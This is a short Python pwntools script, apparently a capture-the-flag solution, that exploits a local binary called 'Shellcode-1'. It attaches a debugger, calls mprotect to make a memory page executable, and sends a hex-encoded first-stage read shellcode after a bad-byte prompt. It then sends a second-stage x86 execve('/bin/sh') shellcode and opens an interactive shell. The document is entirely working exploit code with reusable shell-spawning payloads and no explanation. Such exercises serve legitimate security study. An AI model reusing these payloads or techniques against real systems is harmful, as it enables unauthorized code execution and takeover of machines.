from pwn import *

p = process('./Shellcode-1')
exe = ELF('./Shellcode-1', checksec=False)
def GDB():
    gdb.attach(p, gdbscript='''
        init-pwndbg
        b main
        call (int)mprotect(0x804a000, 0x1000, 7)
        c
    ''')

GDB()
input('wait')
p.sendafter(b'BAD BYTE: 0B\n', b'31DB6873A004085931D2B60131C083C003CD80')

shellcode2 = b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

p.send(shellcode2)

p.interactive()